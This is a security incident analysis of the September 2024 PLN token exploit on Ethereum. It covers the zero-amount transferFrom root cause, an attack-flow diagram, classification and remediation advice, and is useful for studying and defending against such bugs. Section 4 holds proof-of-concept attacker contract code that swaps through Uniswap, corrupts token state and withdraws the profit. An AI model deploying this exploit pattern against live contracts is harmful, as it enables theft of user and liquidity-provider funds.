# PLN Token — Post-`transferFrom(addr, dead, 0)` Token Balance Theft Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-14 |
| **Protocol** | PLN Token |
| **Chain** | Ethereum |
| **Loss** | ~400,000 USD |
| **Attacker** | [0x67404bcd629E920100c594d62f3678340F40D95a](https://etherscan.io/address/0x67404bcd629E920100c594d62f3678340F40D95a) |
| **Attack Tx** | [0xcc36283cee837a8a0d4af0357d1957dc561913e44ad293ea9da8acf15d874ed5](https://etherscan.io/tx/0xcc36283cee837a8a0d4af0357d1957dc561913e44ad293ea9da8acf15d874ed5) |
| **Vulnerable Contract** | [0xe0c218e1633A5C76d57Ff4f11149F07BfFF16aeA](https://etherscan.io/address/0xe0c218e1633A5C76d57Ff4f11149F07BfFF16aeA) |
| **Root Cause** | Calling `transferFrom(addr, dead, 0)` on the PLN token corrupts internal contract state, allowing subsequent transfer amount manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/PLN_exp.sol) |

---

## 1. Vulnerability Overview

The PLN token contract contained a vulnerability where calling `transferFrom(addr, dead, 0)` — transferring a zero amount to the dead address — caused abnormal modification of internal state. The attacker swapped 0.9 ETH via WETH → PLN, called `transferFrom(addr, dead, 0)`, then swapped the entire PLN balance back to WETH, extracting approximately $400,000 in profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: zero-amount transferFrom modifies internal state
function transferFrom(
    address from,
    address to,
    uint256 amount
) public override returns (bool) {
    if (amount == 0) {
        // ❌ Special logic executes even on zero-amount transfer — modifies internal balance/distribution state
        _updateDistribution(from, to);  // state can be manipulated
        return true;
    }
    return super.transferFrom(from, to, amount);
}

// ✅ Correct code: return immediately on zero-amount transfer
function transferFrom(
    address from,
    address to,
    uint256 amount
) public override returns (bool) {
    if (amount == 0) return true;  // ✅ Zero transfer returns without state modification
    return super.transferFrom(from, to, amount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: PLNTOKEN.sol
contract IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);  // ❌ vulnerable

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Swap WETH 0.9 ETH → PLN (Uniswap V2)
  │
  ├─[2]─► Call PLN.transferFrom(addr, dead, 0)
  │         └─► Zero-amount transfer corrupts PLN internal state
  │               └─► Manipulates balance/distribution calculation
  │
  ├─[3]─► Swap entire PLN balance → WETH
  │         └─► Manipulated state yields more WETH on swap
  │
  ├─[4]─► Unwrap WETH → ETH
  │
  └─[5]─► Total loss: ~400,000 USD
```

## 4. PoC Code (Core Logic with Comments)

```solidity
contract AttackerC {
    function attack() public payable {
        // [1] Deposit WETH and swap
        IWETH9(weth9).deposit{value: msg.value}();
        IWETH9(weth9).approve(UniswapV2Router02, type(uint256).max);
        IPLNTOKEN(PLNTOKEN).approve(UniswapV2Router02, type(uint256).max);

        address[] memory path1 = new address[](2);
        path1[0] = weth9;
        path1[1] = PLNTOKEN;
        IUniswapV2Router02(UniswapV2Router02)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                msg.value, 0, path1, address(this), block.timestamp
            );

        // [2] Call transferFrom(addr, dead, 0) — manipulate internal state via zero-amount transfer
        IPLNTOKEN(PLNTOKEN).transferFrom(addr, dead, 0);

        // [3] Swap entire PLN → WETH (profit from manipulated state)
        uint256 balPLN = IPLNTOKEN(PLNTOKEN).balanceOf(address(this));
        address[] memory path2 = new address[](2);
        path2[0] = PLNTOKEN;
        path2[1] = weth9;
        IUniswapV2Router02(UniswapV2Router02)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                balPLN, 0, path2, address(this), block.timestamp
            );

        uint256 balWETH = IWETH9(weth9).balanceOf(address(this));
        IWETH9(weth9).withdraw(balWETH);
        payable(tx.origin).call{value: address(this).balance}("");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Business Logic Error — calling `transferFrom(addr, dead, 0)` with a zero amount modifies internal state variables used in subsequent transfer amount calculations, allowing manipulation of future transfer amounts |
| **Attack Technique** | Zero-Amount transferFrom State Manipulation |
| **DASP Category** | Business Logic Error |
| **CWE** | CWE-20: Improper Input Validation |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Return immediately on zero-amount transfers**: In both `transfer()` and `transferFrom()`, if `amount == 0`, return `true` immediately without modifying state.
2. **Simplify transfer logic**: Remove any special handling for zero-amount transfers inside `_transfer`.
3. **Decouple state changes**: Any state modifications unrelated to transfer events should be moved to separate functions.
4. **Fuzz testing**: Thoroughly test `transferFrom` behavior against boundary cases including 0, 1, and maximum values.

## 7. Lessons Learned

- **Danger of zero-amount transfers**: The ERC20 standard permits zero-amount transfers, but any internal state-modification logic triggered by them becomes a vulnerability.
- **Simplicity of the attack**: Without any complex flash loan, a single zero-amount call drained $400,000.
- **Review all custom transfer logic**: Any custom transfer logic that deviates from standard ERC20 must include boundary value checks.